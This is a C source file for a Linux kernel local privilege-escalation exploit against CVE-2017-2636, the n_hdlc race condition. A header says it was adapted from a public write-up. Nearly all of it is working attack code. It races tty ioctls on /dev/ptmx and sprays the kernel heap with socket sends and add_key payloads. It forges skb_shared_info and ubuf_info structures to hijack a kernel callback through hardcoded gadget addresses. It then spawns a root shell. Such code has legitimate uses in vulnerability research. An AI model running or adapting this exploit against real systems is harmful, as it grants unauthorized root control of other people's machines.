/* exploit written by kylebot
 * modified from https://a13xp0p0v.github.io/2017/03/24/CVE-2017-2636.html
 * */
#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <pthread.h>
#include <errno.h>
#include <string.h>
#include <assert.h>
#include <keyutils.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <asm-generic/ioctls.h>
#include <asm/termbits.h>
#include "libexp.h"

#define KMALLOC_PAD 16
#define TTY_BUF_SZ 0x100
#define MSG_SPRAY_NUM 8
#define BUF_SPRAY_NUM 60
#define PORT 12345
#define SHINFO_OFFSET 7872
#define CRASH_IP 0xffffffff811883ac
//#define CRASH_IP 0xffffffffdeadbeef
#define UADDR2 0x8000000000

/******************************************************************/
/*************************AUTO GENERATED***************************/
#define _GNU_SOURCE
#ifndef va_start
#include <stdarg.h>
#endif
#ifndef assert
#include <assert.h>
#endif
#ifndef signal
#include <signal.h>
#endif
#ifndef sched_setaffinity
#include <sched.h>
#endif

// we need this because rcx may not be restored in the trampoline
// so it will crash during kernel-user switch
void get_shell(int signum) {
    printf("uid: %d\n", getuid());
    system("/bin/sh");
    while(1);
}

void __attribute__((constructor)) _ret2reg_init() {
    signal(SIGSEGV, get_shell);
    signal(SIGTRAP, get_shell);
}

unsigned long _args[6];
unsigned long _arg_num = 0;
void __trigger()
{

    __asm__(".intel_syntax noprefix;"
            "push rbp;"

            "mov rcx, %0;"
            "mov rdi, [rcx+8*0];"
            "mov rsi, [rcx+8*1];"
            "mov rdx, [rcx+8*2];"
            "mov r10, [rcx+8*3];"
            "mov r8, [rcx+8*4];"
            "mov r9, [rcx+8*5];"

                        "mov rbx, 0xffffffff81000be9;"
                        "mov rbp, 0xffffffff8244ab00;"
                        "mov r12, 0xffffffff810d0ad0;"
                        "mov r13, 0xffffffff810031a4;"

            "mov rax, 45;"
            "syscall;"
            "pop rbp;"
            ".att_syntax;"
            : : "r"(_args));
}

void _trigger(int num_args, ...)
{
    va_list ap;
    va_start(ap, num_args);
    for(int i=0; i<num_args; i++) {
        _args[_arg_num++] = va_arg(ap, unsigned long);
    }
    va_arg(ap, unsigned long);
    va_end(ap);

    __asm__(".intel_syntax noprefix;"
            "call __trigger;"
            ".att_syntax;");
    _arg_num = 0;
    if(getuid() == 0) get_shell(0);
}

#define NUMARGS(...)  (sizeof((unsigned long[]){__VA_ARGS__})/sizeof(unsigned long))
#define ret2reg_trigger(...) _trigger(NUMARGS(__VA_ARGS__), __VA_ARGS__ )
/*************************AUTO GENERATED***************************/
/******************************************************************/

int ptmd;
int value = 0;
int *stage = &value;
char payload[0x2000];
char exp_buffer[7872];
u64 kaddr;

struct skb_shared_info {
    uint8_t  __unused;      // __u8
    uint8_t  meta_len;      // __u8
    uint8_t  nr_frags;      // __u8
    uint8_t  tx_flags;      // __u8
    uint16_t gso_size;      // unsigned short
    uint16_t gso_segs;      // unsigned short
    uint64_t frag_list;     // struct sk_buff *
    uint64_t hwtstamps;     // struct skb_shared_hwtstamps
    uint32_t gso_type;      // unsigned int
    uint32_t tskey;         // u32
    uint32_t dataref;       // atomic_t
    uint64_t destructor_arg;    // void *
    uint8_t  frags[16][17];     // skb_frag_t frags[MAX_SKB_FRAGS];
};

struct ubuf_info {
    uint64_t callback;  // void (*callback)(struct ubuf_info *, bool)
    uint64_t ctx;       // void *
    uint64_t desc;      // unsigned long
};

void init_skb_buffer(char* buffer) {
    struct skb_shared_info* ssi = (struct skb_shared_info*)buffer;
    memset(ssi, 0, sizeof(*ssi));

    ssi->gso_size = 0xff00;
    ssi->tx_flags = 0xff;
    ssi->destructor_arg = kaddr;
    ssi->nr_frags = 0;
    ssi->frag_list = 0;
}

void *func1(void *arg)
{
	//set_cpu(1);
	while(*stage == 0);
	ioctl(ptmd, TCFLSH, TCIOFLUSH);
}

void *func2(void *arg)
{
	//set_cpu(2);
	while(*stage == 0);
	ioctl(ptmd, TCXONC, TCOON);
}

void trigger(void)
{
	pthread_t t1, t2;
	*stage = 0;

	pthread_create(&t1, NULL, func1, NULL);
	pthread_create(&t2, NULL, func2, NULL);
	usleep(10000);
	*stage = 1;
	usleep(10000);
	*stage = 0;
}

struct udp_fifo_handle {
	int fds[2];
};

void udp_fifo_init(struct udp_fifo_handle* handle) {
	int rv = socketpair(AF_LOCAL, SOCK_DGRAM, 0, handle->fds);
	if (rv != 0) {
		perror("[-] fail to create heap spraying sockets");
		exit(-1);
	}
}

void udp_fifo_kmalloc(struct udp_fifo_handle* handle, char *buffer) {
	int rv = send(handle->fds[0], buffer, 7872, 0);
	if (rv != 7872) {
		perror("send()");
		exit(-1);
	}
}

void udp_fifo_kfree(struct udp_fifo_handle* handle, char *buffer) {
	int rv = recv(handle->fds[1], buffer, 7872, 0);
	if (rv != 7872) {
		perror("recv()");
		exit(-1);
	}
}

void udp_kmalloc_pad() {
	int i, j;
	char dummy[2048];
	struct udp_fifo_handle uh[16];
	for (i = 0; i < KMALLOC_PAD / 16; i++) {
		udp_fifo_init(&uh[i]);
		for (j = 0; j < 16; j++)
			udp_fifo_kmalloc(&uh[i], &dummy[0]);
	}
}

void defragmentation(u32 num)
{
	char buffer[0x2000];
	add_key_spray_num(buffer, 0x2000-0x30, num);
}

void socket_sendmmsg(int sock, char *buffer) {
	struct mmsghdr msg[1];

	msg[0].msg_hdr.msg_iovlen = 0;

	// Buffer to kmalloc.
	msg[0].msg_hdr.msg_control = &buffer[0];
	msg[0].msg_hdr.msg_controllen = 0x2000;

	// Make sendmmsg exit easy with EINVAL.
	msg[0].msg_hdr.msg_name = "root";
	msg[0].msg_hdr.msg_namelen = 1;

	int rv = syscall(__NR_sendmmsg, sock, msg, 1, 0);
	if (rv == -1 && errno != EINVAL) {
		perror("[-] sendmmsg()");
		exit(EXIT_FAILURE);
	}
}

u64 _get_mem_size(void)
{
    FILE *f = fopen("/proc/meminfo", "r");
    char *line_buf = NULL;
    char *buf;
    size_t n;

    assert(f != NULL);

    if(getline(&line_buf, &n, f) < 0) {
        free(line_buf);
        goto out;
    }
    buf = strstr(line_buf, ":") + 1;
    fclose(f);
    return atoll(buf) * 1024;

out:
    puts("fail to read memory size");
    fclose(f);
    return -1;
}

void payload_setup(void)
{
	struct ubuf_info *ui;

	// setup ubuf_info
	u64 upper_limit = _get_mem_size() & (~0xfff);
    kaddr = 0xffff880000000000 + upper_limit/4*3;
    kaddr &= 0xfffffffffffff000;
    printf("kaddr: %#llx\n", kaddr);
	umem_alloc((void *)UADDR2, 0x1000);
	ui = (struct ubuf_info *)UADDR2;
    ui->callback = CRASH_IP;
	for(int i=0;i<upper_limit/0x1000/4;i++) {
        void *addr = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_ANON|MAP_PRIVATE|MAP_POPULATE, -1, 0);
        memcpy(addr, ui, sizeof(struct ubuf_info));
    }

	// setup payload + skb_shared_info
	memset(payload, 'C', sizeof(payload));
	memset(&payload[SHINFO_OFFSET]-0x20, 0, sizeof(payload)-SHINFO_OFFSET+0x10);
	init_skb_buffer(&payload[SHINFO_OFFSET]);
	*(long *)&payload[18] = 0;

	memset(exp_buffer, 'B', sizeof(exp_buffer));
	memset(exp_buffer, 0, 8);
}

int main()
{
	int ret;
	int ldisc = N_HDLC;
	char buf[TTY_BUF_SZ];
	char udp_buffer[7872];
	int bytes;
	struct udp_fifo_handle handle;
	struct udp_fifo_handle exp_handle;

	payload_setup();

	memset(buf, 'A', sizeof(buf));


	//defragmentation(10);
	for(int i=0; i<1000; i++) {
		//defragmentation(5);
		if(handle.fds[0]) {
			close(handle.fds[0]);
			close(handle.fds[1]);
		}
		if(exp_handle.fds[0]) {
			close(exp_handle.fds[0]);
			close(exp_handle.fds[1]);
		}
		udp_fifo_init(&handle);
		udp_fifo_init(&exp_handle);

		printf("i: %d\n", i);
		puts("-------------------------");
		ptmd = open("/dev/ptmx", O_RDWR);
		if(ptmd < 0) error_out("[-] open /dev/ptmx");

		ret = ioctl(ptmd, TIOCSETD, &ldisc);
		if(ret < 0) error_out("[-] TIOCSETD");

		ret = ioctl(ptmd, TCXONC, TCOOFF);
		if(ret < 0) error_out("[-] TCXONC TCOOFF");

		bytes = write(ptmd, buf, TTY_BUF_SZ);
		if (bytes != TTY_BUF_SZ) error_out("[-] write to ptmx (bytes)\n");

		trigger();

		ret = close(ptmd);
		if(unlikely(ret != 0)) error_out("[-] close /dev/ptmx");

		// the bug may be triggered now
		// step1. do some allocation and we taint the buffer
		for(int i=0; i<MSG_SPRAY_NUM; i++) {
			memset(&udp_buffer[8], (char)i, 8);
			memset(udp_buffer, 0, 8);// don't fk up slub freelist
			udp_fifo_kmalloc(&handle, udp_buffer);
		}
		// step2. check whether the vulnerability is triggered by checking the taint
		// if there is a mismatch between taint and index, that means the vulnerability is triggered.
		int array[MSG_SPRAY_NUM];
		memset(array, 0, sizeof(array));
		char taint;
		int idx = -1;
		for(int i=0; i<MSG_SPRAY_NUM; i++) {
			udp_fifo_kfree(&handle, udp_buffer);
			taint = ((char *)udp_buffer)[9];
			if(i != (int)taint) {
				idx = i;
				break;
			}
		}

		// in case not triggered, just continue
		if(unlikely(idx < 0)) continue;

		// taint should be larger than idx because the second allocation overwrites the first one
		// if there is anything wrong, we pretend nothing happened, clean up leftovers and continue
		if(unlikely(taint < idx)) {
			for(int i=idx+1; i<MSG_SPRAY_NUM; i++) {
				udp_fifo_kfree(&handle, udp_buffer);
			}
			continue;
		}

		// allocate the vulnerable struct sk_buff
		for(int i=0; i<10; i++) {
			udp_fifo_kmalloc(&exp_handle, exp_buffer);
		}

		//puts(">>");
		//printf("%d %d\n", idx, taint);
		//getchar();

		// free the left buffers and one of them should be overlapping with one of the target objects
		for(int i=idx+1; i<MSG_SPRAY_NUM; i++) {
			char type[] = "user";
    		char desc[0x10];
    		memset(desc, 0, sizeof(desc));

			udp_fifo_kfree(&handle, udp_buffer);
			// add_key_spray_num(&payload[0x12], 0x2000-0x30, 1);

    		for(int i=0; i<1; i++) {
    		    rand_str(desc, sizeof(desc)-1);
    		    add_key(type, desc, &payload[0x12], 0x2000-0x30, KEY_SPEC_THREAD_KEYRING);
    		}
		}

		// try to trigger the vulnerability
		for(int i=0; i<10; i++) {
			// udp_fifo_kfree(&exp_handle, exp_buffer);
			ret2reg_trigger(exp_handle.fds[1], exp_buffer, 7872, 0);
		}

		exit(0);
	}
}
